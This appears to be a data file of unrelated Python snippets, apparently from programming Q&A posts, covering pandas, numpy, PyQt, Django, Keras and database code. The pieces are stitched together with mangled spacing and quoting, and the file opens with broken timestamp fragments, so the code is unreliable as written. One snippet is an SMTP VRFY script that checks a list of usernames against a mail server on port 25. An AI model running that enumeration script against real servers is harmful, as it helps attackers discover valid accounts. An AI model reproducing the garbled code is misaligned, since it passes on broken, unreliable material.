09:29:00 8.062017-09-28 10:41:00 2017-09-28 11:21:00 22.342017-09-28 14:26:00 2017-09-28 16:05:00 35.572017-09-28 16:09:00 2017-09-28 16:21:00 1.172017-09-28 20:37:00 2017-09-28 20:40:00 1.12017-09-28 20:56:00 2017-09-28 21:00:00 1.152017-09-29 09:32:00 2017-09-29 10:02:00 19.73
"> > > import win32net > > > win32net.NetUserGetGroups ( 'domain_name.com ' , 'username ' ) [ ( u'Domain Users ' , 7 ) , ... ]"
import sysif something_to_read_from_stdin_aka_piped_to : cmd = sys.stdin.read ( ) print ( cmd ) else : print ( `` standard behavior '' ) echo `` test '' | python myscript.py
"import seaborn as snsimport pandas as pdinput_csv = pd.read_csv ( './test.csv ' , index_col = 0 , header = 0 ) input_csv sns.lmplot ( x='Age ' , y='Count of Specific Strands ' , data = input_csv ) < seaborn.axisgrid.FacetGrid at 0x2800985b710 > import statsmodels.formula.api as smftest_results = smf.ols ( 'Count of Specific Strands ~ Age ' , data = input_csv ) .fit ( ) File `` < unknown > '' , line 1 Count of Specific Strands ^SyntaxError : invalid syntax test_results = smf.ols ( 'input_csv.iloc [ : ,1 ] ~ Age ' , data = input_csv ) .fit ( ) test_results.summary ( )"
"if settings.DEBUG : from django.conf.urls.static import static from common.views.static import serve urlpatterns += static ( settings.MEDIA_URL , document_root=settings.MEDIA_ROOT ) urlpatterns += static ( settings.STATIC_URL , document_root=settings.STATIC_ROOT , view=serve ) from django.views.static import serve as static_servedef serve ( request , path , document_root=None , show_indexes=False ) : `` '' '' An override to ` django.views.static.serve ` that will allow us to add our own headers for development . Like ` django.views.static.serve ` , this should only ever be used in development , and never in production. `` '' '' response = static_serve ( request , path , document_root=document_root , show_indexes=show_indexes ) response [ 'Access-Control-Allow-Origin ' ] = '* ' return response"
"File `` errorchecker.pyx '' , line 53 , in OpenGL_accelerate.errorchecker._ErrorChecker.glCheckError ( src/errorchecker.c:1218 ) OpenGL.error.GLError : GLError ( err = 1286 , description = 'invalid framebuffer operation ' , baseOperation = glClear , cArguments = ( GL_COLOR_BUFFER_BIT , ) ) from PyQt5 import QtGui , QtCore , QtOpenGL , QtWidgetsfrom PyQt5.QtOpenGL import QGLWidgetfrom OpenGL.GL import *from time import sleepNSKIP_PAINTGL = 3class QGLControllerWidget ( QGLWidget ) : `` '' '' basic test widget : a black screen which clears framebuffer on paintGL event so it should stay black on resize and so on. `` '' '' def __init__ ( self , format = None ) : super ( QGLControllerWidget , self ) .__init__ ( format , None ) self._weird_pyqt5_framebuffer_hack = 0 # replace paintGL by workaround self._weird_pyqt5_framebuffer_hack_original_paintGL = self.paintGL self.paintGL = self._weird_pyqt5_framebuffer_hack_paintGL def initializeGL ( self ) : pass def _weird_pyqt5_framebuffer_hack_paintGL ( self ) : self._weird_pyqt5_framebuffer_hack += 1 if self._weird_pyqt5_framebuffer_hack < NSKIP_PAINTGL : return sleep ( 0.1 ) # restore original paintGL self.paintGL = self._weird_pyqt5_framebuffer_hack_original_paintGL self.updateGL ( ) def paintGL ( self ) : glClear ( GL_COLOR_BUFFER_BIT ) if __name__ == '__main__ ' : import sys class QTWithGLTest ( QtWidgets.QMainWindow ) : def __init__ ( self , parent = None ) : super ( QTWithGLTest , self ) .__init__ ( parent ) # MacOS core profile 4.1 qgl_format = QtOpenGL.QGLFormat ( ) qgl_format.setVersion ( 4 , 1 ) qgl_format.setProfile ( QtOpenGL.QGLFormat.CoreProfile ) qgl_format.setSampleBuffers ( True ) self.widget = QGLControllerWidget ( qgl_format ) self.setCentralWidget ( self.widget ) self.show ( ) app = QtWidgets.QApplication ( sys.argv ) window = QTWithGLTest ( ) window.show ( ) app.exec_ ( )"
"import numpy as npprint `` Initializing a number of numpy arrays : \n '' a = np.zeros ( ( 3 , ) , dtype= ( 'i4 , i4 , a1 ' ) ) a [ : ] = [ ( 1 , 2 , ' A ' ) , ( 3 , 4 , ' B ' ) , ( 5 , 6 , ' A ' ) ] print `` a : `` print a # print = > [ ( 1 , 2 , ' A ' ) ( 3 , 4 , ' B ' ) ( 5 , 6 , ' A ' ) ] print repr ( a ) # print = > array ( [ ( 1 , 2 , ' A ' ) , ( 3 , 4 , ' B ' ) , ( 5 , 6 , ' A ' ) ] , # dtype= [ ( 'f0 ' , ' < i4 ' ) , ( 'f1 ' , ' < i4 ' ) , ( 'f2 ' , '|S1 ' ) ] print '\n ' b = [ ] ; b [ : ] = [ ( 1 , 2 , ' A ' ) , ( 3 , 4 , ' B ' ) , ( 5 , 6 , ' A ' ) ] print `` b : `` print b # print = > [ ( 1 , 2 , ' A ' ) , ( 3 , 4 , ' B ' ) , ( 5 , 6 , ' A ' ) print '\n ' c = np.zeros ( ( 3 , ) , dtype= ( 'i4 , i4 , a1 ' ) ) # c [ : ] = [ [ 1 , 2 , ' A ' ] , [ 3 , 4 , ' B ' ] , [ 5 , 6 , ' A ' ] ] # TypeError : expected a readable buffer objectprint '\n ' # d = np.zeros ( ( 3 , ) , dtype= [ 'i4 , i4 , a1 ' ] ) # TypeError : data type not understood # d [ : ] = [ [ 1 , 2 , ' A ' ] , [ 3 , 4 , ' B ' ] , [ 5 , 6 , ' A ' ] ] print '\n ' e = np.array ( [ [ 1 , 2 , ' A ' ] , [ 3 , 4 , ' B ' ] , [ 5 , 6 , ' A ' ] ] ) print `` e : `` print e # print = > [ [ ' 1 ' ' 2 ' ' A ' ] # [ ' 3 ' ' 4 ' ' B ' ] # [ ' 5 ' ' 6 ' ' A ' ] ] print '\n ' f = np.array ( [ ( 1 , 2 , ' A ' ) , ( 3 , 4 , ' B ' ) , ( 5 , 6 , ' A ' ) ] ) print `` f : `` print f # print = > [ [ ' 1 ' ' 2 ' ' A ' ] # [ ' 3 ' ' 4 ' ' B ' ] # [ ' 5 ' ' 6 ' ' A ' ] ] print '\n ' from StringIO import StringIOdata = StringIO ( `` '' '' 1 , 2 , A3 , 4 , B5 , 6 , A '' '' '' .strip ( ) ) g = np.genfromtxt ( data , dtype=object , delimiter= ' , ' ) print `` g : `` print g # print = > [ [ 1 2 A ] # [ 3 4 B ] # [ 5 6 A ] ] print '\n ' # print `` a : `` # print a [ : ,2 ] # IndexError : invalid indexprint `` a : `` print a [ 'f2 ' ] # This is ok though # Splicing a normal list of tuples if not expected to work # print `` b : `` # print b [ : ,2 ] # IndexError : invalid index print `` e : `` print e [ : ,2 ] # print = > [ ' A ' ' B ' ' A ' ] print `` f : `` print f [ : ,2 ] # print = > [ ' A ' ' B ' ' A ' ] print `` g : `` print g [ : ,2 ] # print = > [ A B A ]"
"import numpy as npprint np.array ( [ [ 0 , 1 ] , [ 2 , 3 ] ] ) # [ [ 0 1 ] # [ 2 3 ] ] # the output isoutput = `` ' [ [ 0 1 ] [ 2 3 ] ] ' '' import repat_ignore = re.compile ( r ' [ \ [ \ ] ] ' ) numbers = pat_ignore.sub ( `` , output ) print np.array ( [ map ( float , line.split ( ) ) for line in numbers.splitlines ( ) ] ) [ [ 0 . 1 . ] [ 2 . 3 . ] ] [ [ [ 0 1 ] [ 2 3 ] ] ] [ [ 0 . 1 . ] [ 2 . 3 . ] ]"
"dic1 = { ' a ' : [ 3 , 1 , 5 , 2 ] , ' b ' : [ 3 , 1 , 6 , 3 ] , ' c ' : [ 6 , 7 , 3 , 0 ] } dic2 = { ' c ' : [ 7 , 3 , 5 , 9 ] , 'd ' : [ 9 , 0 , 2 , 5 ] , ' e ' : [ 4 , 8 , 3 , 7 ] } df1 = pd.DataFrame ( dic1 ) df2 = pd.DataFrame ( dic2 , index = [ 4 , 5 , 6 , 7 ] ) a b c0 3 3 61 1 1 72 5 6 33 2 3 0 c d e4 7 9 45 3 0 86 5 2 37 9 5 7 df1 + df2 a b c d e 0 NaN NaN NaN NaN NaN 1 NaN NaN NaN NaN NaN 2 NaN NaN NaN NaN NaN 3 NaN NaN NaN NaN NaN 4 NaN NaN NaN NaN NaN 5 NaN NaN NaN NaN NaN 6 NaN NaN NaN NaN NaN 7 NaN NaN NaN NaN NaN"
"import dask # create dask dataframe from the arraydd = dask.dataframe.from_array ( mainArray , chunksize=100000 , columns= ( 'posX ' , 'posY ' , 'time ' , 'energy ' ) ) # Set the bins to bin along energybins = range ( 0 , 10000 , 500 ) # Create the cut in energy ( using non-parallel pandas code ... ) energyBinner=pandas.cut ( dd [ 'energy ' ] , bins ) # Group the data according to posX , posY and energygrouped = dd.compute ( ) .groupby ( [ energyBinner , 'posX ' , 'posY ' ] ) # Apply the count ( ) method to the data : numberOfEvents = grouped [ 'time ' ] .count ( )"
print ( df ) Employee_number Jobrol0 1 Sales Executive1 2 Research Scientist2 3 Laboratory Technician3 4 Sales Executive4 5 Research Scientist5 6 Laboratory Technician6 7 Sales Executive7 8 Research Scientist8 9 Laboratory Technician9 10 Sales Executive10 11 Research Scientist11 12 Laboratory Technician12 13 Sales Executive13 14 Research Scientist14 15 Laboratory Technician15 16 Sales Executive16 17 Research Scientist17 18 Research Scientist18 19 Manager19 20 Human Resources20 21 Sales ExecutivevalCount = df [ 'Jobrol ' ] .value_counts ( ) valCountSales Executive 7Research Scientist 7Laboratory Technician 5Manager 1Human Resources 1
"from PyQt5 import QtWidgetsclass Q ( QtWidgets.QLabel ) : def wheelEvent ( self , event ) : print ( event.pixelDelta ( ) ) app = QtWidgets.QApplication ( [ ] ) w = Q ( ) w.show ( ) app.exec_ ( )"
language : pythonpython : - 2.7install : - pip install -r requirements.txt - pip install coverage - pip install codeclimate-test-reporter # commands to run tests : script : - python mytests.py - coverage run mytests.pyafter_success : - codeclimate-test-reporter /home/travis/build.sh : line 45 : codeclimate-test_reporter : command not found
{ % if list_tasks % } The following tasks will be removed from this group : < ul > { % for task in list_tasks|slice : '' :10 '' % } < li > { { task.name } } < /li > { % endfor % } { % if list_tasks|length > 10 % } < li > ... and { { list_tasks|length|add : '' -10 '' } } other tasks < /li > { % endif % } < /ul > { % endif % } The following tasks will be removed from this group : - T06/081 - T15/0395 - T15/0545 - T11/723 - T13/758 - T14/1532 - T14/1512 - T14/1510 - T04/154 - T14/1528 - ... and 243 other tasks
enter integer : 502 is super1 is super number = int ( input ( `` enter integer : `` ) ) def factorial ( n ) : result = 1 i = n * ( n-1 ) while n > = 1 : result = result * n n = n-1 return result # print ( factorial ( number ) ) def breakdown ( n ) : breakdown_num = 0 remainder = 0 if n < 10 : breakdown_num += factorial ( n ) return breakdown_num else : while n > 10 : digit = n % 10 remainder = n // 10 breakdown_num += factorial ( digit ) # print ( str ( digit ) ) # print ( str ( breakdown_num ) ) n = remainder if n < 10 : # print ( str ( remainder ) ) breakdown_num += factorial ( remainder ) # print ( str ( breakdown_num ) ) return breakdown_num # print ( breakdown ( number ) ) if ( breakdown ( number ) ) == number : print ( str ( number ) + `` is super '' )
"import osimport mysql.connector ** < -- - import mySqlDb**import timeoutDict = dict ( ) # # DB parametersdb = mysql.connector.connect ** < -- -- - mySqlDb.connect ( ... ** ( host=dbhost , user=username , # your usernamepasswd=passw , # your passworddb=database ) # name of the data basecur = db.cursor ( prepared=True ) sql = `` select chr , pos , lengthofrepeat , copyNum , region from db.Table_simpleRepeat ; '' cur.execute ( sql ) print ( '\t eDiVa public omics start ' ) s = time.time ( ) sz = 1000rows = cur.fetchall ( ) for row in rows : # # process out dict print time.time ( ) - s cur.close ( ) db.close ( ) use strict ; use Digest : :MD5 qw ( md5 ) ; use DBI ; use threads ; use threads : :shared ; my $ dbh = DBI- > connect ( 'dbi : mysql : '. $ database. ' ; host='. $ dbhost . '' , $ username , $ pass ) or die `` Connection Error ! ! \n '' ; my $ sql = `` select chr , pos , lengthofrepeat , copyNum , region from db.Table_simpleRepeat\ ; '' ; # # prepare statement and query my $ stmt = $ dbh- > prepare ( $ sql ) ; $ stmt- > execute or die `` SQL Error ! ! \n '' ; my $ c = 0 ; # process query result while ( my @ res = $ stmt- > fetchrow_array ) { $ edivaStr { $ res [ 0 ] . `` ; '' . $ res [ 1 ] } = $ res [ 4 ] . `` , '' . $ res [ 2 ] ; $ c +=1 ; } print ( $ c . `` \n '' ) ; # # close DB connection $ dbh- > disconnect ( ) ;"
"# Create the dialog and initialize itthread.start_new_thread ( self.init_dialog , ( arg , arg , arg ... ) ) def init_dialog ( self , arg , arg , arg ... . ) : dialog = MyFrame ( self , `` Dialog '' ) # Setup the dialog # ... . dialog.Show ( )"
tcattr 0.03665385400199739tccall 0.026238360142997408tctry 0.09736267629614304tfattr 0.03624538065832894tfcall 0.026362861895904643tftry 0.032501874250556284tiattr 0.08297350149314298ticall 0.025826044152381655titry 0.10657657453430147tsattr 0.0840187013927789tscall 0.02585409547373274tstry 0.10742772077628615
"class Arc ( object ) : def __init__ ( self , start , radius , rotation , arc , sweep , end ) : `` '' '' radius is complex , rotation is in degrees , large and sweep are 1 or 0 ( True/False also work ) '' '' '' self.start = start self.radius = radius self.rotation = rotation self.arc = bool ( arc ) self.sweep = bool ( sweep ) self.end = end self._parameterize ( ) def _parameterize ( self ) : # Conversion from endpoint to center parameterization # http : //www.w3.org/TR/SVG/implnote.html # ArcImplementationNotes cosr = cos ( radians ( self.rotation ) ) sinr = sin ( radians ( self.rotation ) ) dx = ( self.start.real - self.end.real ) / 2 dy = ( self.start.imag - self.end.imag ) / 2 x1prim = cosr * dx + sinr * dy x1prim_sq = x1prim * x1prim y1prim = -sinr * dx + cosr * dy y1prim_sq = y1prim * y1prim rx = self.radius.real rx_sq = rx * rx ry = self.radius.imag ry_sq = ry * ry # Correct out of range radii radius_check = ( x1prim_sq / rx_sq ) + ( y1prim_sq / ry_sq ) if radius_check > 1 : rx *= sqrt ( radius_check ) ry *= sqrt ( radius_check ) rx_sq = rx * rx ry_sq = ry * ry t1 = rx_sq * y1prim_sq t2 = ry_sq * x1prim_sq c = sqrt ( ( rx_sq * ry_sq - t1 - t2 ) / ( t1 + t2 ) ) if self.arc == self.sweep : c = -c cxprim = c * rx * y1prim / ry cyprim = -c * ry * x1prim / rx self.center = complex ( ( cosr * cxprim - sinr * cyprim ) + ( ( self.start.real + self.end.real ) / 2 ) , ( sinr * cxprim + cosr * cyprim ) + ( ( self.start.imag + self.end.imag ) / 2 ) ) ux = ( x1prim - cxprim ) / rx uy = ( y1prim - cyprim ) / ry vx = ( -x1prim - cxprim ) / rx vy = ( -y1prim - cyprim ) / ry n = sqrt ( ux * ux + uy * uy ) p = ux theta = degrees ( acos ( p / n ) ) if uy > 0 : theta = -theta self.theta = theta % 360 n = sqrt ( ( ux * ux + uy * uy ) * ( vx * vx + vy * vy ) ) p = ux * vx + uy * vy if p == 0 : delta = degrees ( acos ( 0 ) ) else : delta = degrees ( acos ( p / n ) ) if ( ux * vy - uy * vx ) < 0 : delta = -delta self.delta = delta % 360 if not self.sweep : self.delta -= 360 def point ( self , pos ) : if self.arc == self.sweep : angle = radians ( self.theta - ( self.delta * pos ) ) else : angle = radians ( self.delta + ( self.delta * pos ) ) x = sin ( angle ) * self.radius.real + self.center.real y = cos ( angle ) * self.radius.imag + self.center.imag return complex ( x , y ) arc1 = Arc ( 0j , 100+50j , 0 , 0 , 0 , 100+50j ) arc2 = Arc ( 0j , 100+50j , 0 , 1 , 0 , 100+50j ) arc3 = Arc ( 0j , 100+50j , 0 , 0 , 1 , 100+50j ) arc4 = Arc ( 0j , 100+50j , 0 , 1 , 1 , 100+50j ) import turtlet = turtle.Turtle ( ) t.penup ( ) t.goto ( 0 , 0 ) t.dot ( 5 , 'red ' ) t.write ( 'Start ' ) t.goto ( 100 , 50 ) t.dot ( 5 , 'red ' ) t.write ( 'End ' ) t.pencolor = t.color ( 'blue ' ) for arc in ( arc1 , arc2 , arc3 , arc4 ) : t.penup ( ) p = arc.point ( 0 ) t.goto ( p.real , p.imag ) t.pendown ( ) for x in range ( 1,101 ) : p = arc.point ( x*0.01 ) t.goto ( p.real , p.imag ) raw_input ( )"
"# ! /usr/bin/pythonimport socketimport sysif len ( sys.argv ) ! = 2 : print `` Usage : vrfy.py < username file > '' sys.exit ( 0 ) # open user filefile=open ( sys.argv [ 1 ] , ' r ' ) users= [ x.strip ( ) for x in file.readlines ( ) ] file.close # Just for debuggingprint users # Create a Sockets=socket.socket ( socket.AF_INET , socket.SOCK_STREAM ) # Connect to the Serverconnect=s.connect ( ( '192.168.13.222',25 ) ) for x in users : # VRFY a user s.send ( 'VRFY ' + x + '\r\n ' ) result=s.recv ( 1024 ) print result # Close the sockets.close ( )"
"result [ i , j , k ] = ( x [ i ] * y [ j ] * z [ k ] ) .sum ( ) # Example with 3 loops , 2 loops , 1 loop ( testing omitted ) N = 100 # more like 100k in real problemA = 2 # more like 20 in real problemB = 3 # more like 20 in real problemC = 4 # more like 20 in real problemimport numpyx = numpy.random.rand ( A , N ) y = numpy.random.rand ( B , N ) z = numpy.random.rand ( C , N ) # outputs of each variantresult_slow = numpy.empty ( ( A , B , C ) ) result_vec_C = numpy.empty ( ( A , B , C ) ) result_vec_CB = numpy.empty ( ( A , B , C ) ) # 3 nested loopsfor i in range ( A ) : for j in range ( B ) : for k in range ( C ) : result_slow [ i , j , k ] = ( x [ i ] * y [ j ] * z [ k ] ) .sum ( ) # vectorize loop over C ( 2 nested loops ) for i in range ( A ) : for j in range ( B ) : result_vec_C [ i , j , : ] = ( x [ i ] * y [ j ] * z ) .sum ( axis=1 ) # vectorize one C and B ( one loop ) for i in range ( A ) : result_vec_CB [ i , : , : ] = numpy.dot ( x [ i ] * y , z.transpose ( ) ) numpy.testing.assert_almost_equal ( result_slow , result_vec_C ) numpy.testing.assert_almost_equal ( result_slow , result_vec_CB )"
[ build ] executable = /usr/bin/env python
"from keras import modelsfrom keras import layersfrom keras.layers import Dense , LSTMimport numpy as npimport matplotlib.pyplot as plt # # Simulate data.np.random.seed ( 20180825 ) X = np.random.randint ( 50 , 70 , size = ( 11000 , 1 ) ) / 100X = np.concatenate ( ( X , X ) , axis = 1 ) for i in range ( 10 ) : X_next = np.random.randint ( 50 , 70 , size = ( 11000 , 1 ) ) / 100 X = np.concatenate ( ( X , X_next , ( 0.50 * X [ : , -1 ] .reshape ( len ( X ) , 1 ) ) + ( 0.50 * X [ : , -2 ] .reshape ( len ( X ) , 1 ) ) ) , axis = 1 ) print ( X.shape ) # # Training and validation data.split = 10000Y_train = X [ : split , -1 : ] .reshape ( split , 1 ) Y_valid = X [ split : , -1 : ] .reshape ( len ( X ) - split , 1 ) X_train = X [ : split , : -2 ] X_valid = X [ split : , : -2 ] print ( X_train.shape ) print ( Y_train.shape ) print ( X_valid.shape ) print ( Y_valid.shape ) # # FNN model. # Define model.network_fnn = models.Sequential ( ) network_fnn.add ( layers.Dense ( 64 , activation = 'relu ' , input_shape = ( X_train.shape [ 1 ] , ) ) ) network_fnn.add ( Dense ( 1 , activation = None ) ) # Compile model.network_fnn.compile ( optimizer = 'adam ' , loss = 'mean_squared_error ' ) # Fit model.history_fnn = network_fnn.fit ( X_train , Y_train , epochs = 10 , batch_size = 32 , verbose = False , validation_data = ( X_valid , Y_valid ) ) plt.scatter ( Y_train , network_fnn.predict ( X_train ) , alpha = 0.1 ) plt.xlabel ( 'Actual ' ) plt.ylabel ( 'Predicted ' ) plt.show ( ) plt.scatter ( Y_valid , network_fnn.predict ( X_valid ) , alpha = 0.1 ) plt.xlabel ( 'Actual ' ) plt.ylabel ( 'Predicted ' ) plt.show ( ) # # LSTM model.X_lstm_train = X_train.reshape ( X_train.shape [ 0 ] , X_train.shape [ 1 ] // 2 , 2 ) X_lstm_valid = X_valid.reshape ( X_valid.shape [ 0 ] , X_valid.shape [ 1 ] // 2 , 2 ) # Define model.network_lstm = models.Sequential ( ) network_lstm.add ( layers.LSTM ( 64 , activation = 'relu ' , input_shape = ( X_lstm_train.shape [ 1 ] , 2 ) ) ) network_lstm.add ( layers.Dense ( 1 , activation = None ) ) # Compile model.network_lstm.compile ( optimizer = 'adam ' , loss = 'mean_squared_error ' ) # Fit model.history_lstm = network_lstm.fit ( X_lstm_train , Y_train , epochs = 10 , batch_size = 32 , verbose = False , validation_data = ( X_lstm_valid , Y_valid ) ) plt.scatter ( Y_train , network_lstm.predict ( X_lstm_train ) , alpha = 0.1 ) plt.xlabel ( 'Actual ' ) plt.ylabel ( 'Predicted ' ) plt.show ( ) plt.scatter ( Y_valid , network_lstm.predict ( X_lstm_valid ) , alpha = 0.1 ) plt.xlabel ( 'Actual ' ) plt.ylabel ( 'Predicted ' ) plt.show ( )"
"> > > x = ( 1,2,3,4,5 ) > > > x += ( 8,9 ) > > > x ( 1 , 2 , 3 , 4 , 5 , 8 , 9 ) > > > x = ( ( 1,2 ) , ( 3,4 ) , ( 5,6 ) ) > > > x ( ( 1 , 2 ) , ( 3 , 4 ) , ( 5 , 6 ) ) > > > x += ( 8,9 ) > > > x ( ( 1 , 2 ) , ( 3 , 4 ) , ( 5 , 6 ) , 8 , 9 ) > > > x += ( ( 0,0 ) ) > > > x ( ( 1 , 2 ) , ( 3 , 4 ) , ( 5 , 6 ) , 8 , 9 , 0 , 0 )"
"[ { ' a ' : 2 , ' b':1 } { ' a':1 , ' b':2 , ' c':1 } ] list = [ ] for line in file.readlines ( ) : terms = line.split ( `` `` ) dict = { } for term in terms : if term in dict : dict [ term ] = dict [ term ] + 1 else : dict [ term ] = 1 list.append ( dict.copy ( ) ) dict.clear ( ) file.close ( )"
"import scikits.timeseries as tsfrom datetime import datetime a = ts.time_series ( [ 1,2,3 ] , dates= [ datetime ( 2010,10,20 ) , datetime ( 2010,10,21 ) , datetime ( 2010,10,23 ) ] , freq='D ' ) b = ts.time_series ( [ 4,5,6 ] , dates= [ datetime ( 2010,10,20 ) , datetime ( 2010,10,22 ) , datetime ( 2010,10,23 ) ] , freq='D ' ) Day : 20 . 21 . 22 . 23. a : 1 2 - 3 b : 4 - 5 6 Day 20. : ( 0.3 * 1 + 0.7 * 4 ) / ( 0.3 + 0.7 ) = 3.1 / 1 . = 3.1Day 21. : ( 0.3 * 2 ) / ( 0.3 ) = 0.6 / 0.3 = 2Day 22. : ( 0.7 * 5 ) / ( 0.7 ) = 3.5 / 0.7 = 5Day 23. : ( 0.3 * 3 + 0.7 * 6 ) / ( 0.3 + 0.7 ) = 3.1 / 1 . = 5.1 a1 , b1 = ts.aligned ( a , b ) timeseries ( [ 1 2 -- 3 ] , dates = [ 20-Oct-2010 ... 23-Oct-2010 ] , freq = D ) timeseries ( [ 4 -- 5 6 ] , dates = [ 20-Oct-2010 ... 23-Oct-2010 ] , freq = D ) timeseries ( [ 3.1 -- -- 5.1 ] , dates = [ 20-Oct-2010 ... 23-Oct-2010 ] , freq = D ) timeseries ( [ 3.1 2 . 5 . 5.1 ] , dates = [ 20-Oct-2010 ... 23-Oct-2010 ] , freq = D ) | T1 | T2 | T3 | T4 |weight | 0.1 | 0.2 | 0.3 | 0.4 | -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -all present | 10 % | 20 % | 30 % | 40 % |T1 missing | | 22 % | 33 % | 45 % |T1 , T2 miss . | | | 43 % | 57 % |T4 missing | 17 % | 33 % | 50 % | |etc ."
"[ True , False ] and [ True , True ] Out [ 1 ] : [ True , True ] [ True , True ] and [ True , False ] Out [ 2 ] : [ True , False ]"
mosrun ls & [ 1 ] 29199
"class EntryDetail ( DetailView ) : `` '' '' Render a `` detail '' view of an object . By default this is a model instance looked up from ` self.queryset ` , but the view will support display of *any* object by overriding ` self.get_object ( ) ` . `` '' '' context_object_name = 'entry ' template_name = `` blog/entry.html '' slug_field = 'slug ' slug_url_kwarg = 'slug ' def get_object ( self , query_set=None ) : `` '' '' Returns the object the view is displaying . By default this requires ` self.queryset ` and a ` pk ` or ` slug ` argument in the URLconf , but subclasses can override this to return any object. `` '' '' slug = self.kwargs.get ( self.slug_url_kwarg , None ) return get_object_or_404 ( Entry , slug=slug )"
"In [ 51 ] : df1Out [ 51 ] : value 2015-01-01 14:00:00 20 2015-01-01 15:00:00 29 2015-01-01 16:00:00 41 2015-01-01 17:00:00 43 2015-01-01 18:00:00 26 2015-01-01 19:00:00 20 2015-01-01 20:00:00 31 2015-01-01 21:00:00 35 2015-01-01 22:00:00 39 2015-01-01 23:00:00 17 2015-03-01 00:00:00 6 2015-03-01 01:00:00 37 2015-03-01 02:00:00 56 2015-03-01 03:00:00 12 2015-03-01 04:00:00 41 2015-03-01 05:00:00 31 ... ... 2018-12-25 23:00:00 41 < 34843 rows × 1 columns > In [ 52 ] : df2 = pd.DataFrame ( data=None , index=pd.date_range ( freq='60Min ' , start=df1.index.min ( ) , end=df1.index.max ( ) ) ) df2 [ 'value ' ] =np.NaN df2Out [ 52 ] : value 2015-01-01 14:00:00 NaN 2015-01-01 15:00:00 NaN 2015-01-01 16:00:00 NaN 2015-01-01 17:00:00 NaN 2015-01-01 18:00:00 NaN 2015-01-01 19:00:00 NaN 2015-01-01 20:00:00 NaN 2015-01-01 21:00:00 NaN 2015-01-01 22:00:00 NaN 2015-01-01 23:00:00 NaN 2015-01-02 00:00:00 NaN 2015-01-02 01:00:00 NaN 2015-01-02 02:00:00 NaN 2015-01-02 03:00:00 NaN 2015-01-02 04:00:00 NaN 2015-01-02 05:00:00 NaN ... ... 2018-12-25 23:00:00 NaN < 34906 rows × 1 columns > In [ 53 ] : Result = df2.combine_first ( df1 ) ResultOut [ 53 ] : value 2015-01-01 14:00:00 20 2015-01-01 15:00:00 29 2015-01-01 16:00:00 41 2015-01-01 17:00:00 43 2015-01-01 18:00:00 26 2015-01-01 19:00:00 20 2015-01-01 20:00:00 31 2015-01-01 21:00:00 35 2015-01-01 22:00:00 39 2015-01-01 23:00:00 17 2015-01-02 00:00:00 35 2015-01-02 01:00:00 53 2015-01-02 02:00:00 28 2015-01-02 03:00:00 48 2015-01-02 04:00:00 42 2015-01-02 05:00:00 51 ... ... 2018-12-25 23:00:00 41 < 34906 rows × 1 columns > Out [ 53 ] : value 2015-01-01 14:00:00 20 2015-01-01 15:00:00 29 2015-01-01 16:00:00 41 2015-01-01 17:00:00 43 2015-01-01 18:00:00 26 2015-01-01 19:00:00 20 2015-01-01 20:00:00 31 2015-01-01 21:00:00 35 2015-01-01 22:00:00 39 2015-01-01 23:00:00 17 2015-01-02 00:00:00 NaN 2015-01-02 01:00:00 NaN 2015-01-02 02:00:00 NaN 2015-01-02 03:00:00 NaN 2015-01-02 04:00:00 NaN 2015-01-02 05:00:00 NaN ... ... 2018-12-25 23:00:00 41 < 34906 rows × 1 columns >"
< div class= '' container '' > < div class= '' content '' > < a href= '' /item '' > Back < /a > < table class= '' table '' > < thead > < tr > < th > # < /th > < th > Value < /th > < /tr > < /thead > < tbody > < tr > < th scope= '' row '' > Detail-1 < th > < td > Example < /td > < /tr > < tr > < th scope= '' row '' > Detail-2 < /th > < td > Example < /td > < /tr > class NewArticleForm ( FlaskForm ) : detail_1 = StringField ( `` Detail-1 '' ) detail_2 = IntegerField ( `` Detail-2 '' ) ... submit = SubmitField ( `` Submit '' ) < form method= '' POST '' > < table class= '' table '' > { % for name in form % } < tr > < th scope= '' row '' > { { name.label } } < /th > < td > { { name } } < /td > < /tr > { % endfor % } < /table > < /form >
"def svm_loss_vectorized ( W , X , y , reg ) : loss = 0.0dW = np.zeros ( W.shape ) # initialize the gradient as zeronum_train = X.shape [ 0 ] scores = X.dot ( W ) yi_scores = scores [ np.arange ( scores.shape [ 0 ] ) , y ] margins = np.maximum ( 0 , scores - np.matrix ( yi_scores ) .T + 1 ) margins [ np.arange ( num_train ) , y ] = 0loss = np.mean ( np.sum ( margins , axis=1 ) ) loss += 0.5 * reg * np.sum ( W * W ) binary = marginsbinary [ margins > 0 ] = 1row_sum = np.sum ( binary , axis=1 ) binary [ np.arange ( num_train ) , y ] = -row_sum.TdW = np.dot ( X.T , binary ) # AveragedW /= num_train # RegularizedW += reg*Wreturn loss , dW"
"import win32com.clientclsid= ' { 9BA05972-F6A8-11CF-A442-00A0C90A8F39 } 'ShellWindows=win32com.client.Dispatch ( clsid ) import win32com.clientxl = win32com.client.Dispatch ( `` Excel.Application '' ) from comtypes import client , GUIDgraph = client.CreateObject ( some_CLSID ) graph.QueryInterface ( ... ) // Query the capture filter for the IAMVideoProcAmp interface.IAMVideoProcAmp *pProcAmp = 0 ; hr = pCap- > QueryInterface ( IID_IAMVideoProcAmp , ( void** ) & pProcAmp ) ; hr = m_pProcAmp- > GetRange ( VideoProcAmp_Brightness , & Min , & Max , & Step , & Default , & Flags ) ; from comtypes.gen.DirectShowLib import ( FilterGraph , CaptureGraphBuilder2 , ... )"
"g , ka , hc , ij , ed , ii , hb , bd , di , ad , h import pandas as pddf = pd.read_csv ( `` test.csv '' , usecols= [ 0,1 ] , prefix= '' ID_ '' , header=None ) from sklearn.preprocessing import LabelEncoder # Initialize the LabelEncoder.le = LabelEncoder ( ) le.fit ( df.values.flat ) # Convert to digits.df = df.apply ( le.transform ) 0 10 4 61 0 42 2 53 6 34 3 55 5 46 1 17 3 28 5 09 3 4 df = pd.DataFrame ( { 'ID_0 ' : np.random.randint ( 0,1000,1000000 ) , 'ID_1 ' : np.random.randint ( 0,1000,1000000 ) } ) .astype ( str ) df.info ( ) memory usage : 7.6MB % timeit x = ( df.stack ( ) .astype ( 'category ' ) .cat.rename_categories ( np.arange ( len ( df.stack ( ) .unique ( ) ) ) ) .unstack ( ) ) 1 loops , best of 3 : 1.7 s per loop df = pd.DataFrame ( { 'ID_0 ' : np.random.randint ( 0,1000,10000000 ) , 'ID_1 ' : np.random.randint ( 0,1000,10000000 ) } ) .astype ( str ) df.info ( ) memory usage : 76.3+ MB % timeit x = ( df.stack ( ) .astype ( 'category ' ) .cat.rename_categories ( np.arange ( len ( df.stack ( ) .unique ( ) ) ) ) .unstack ( ) ) MemoryError Traceback ( most recent call last )"
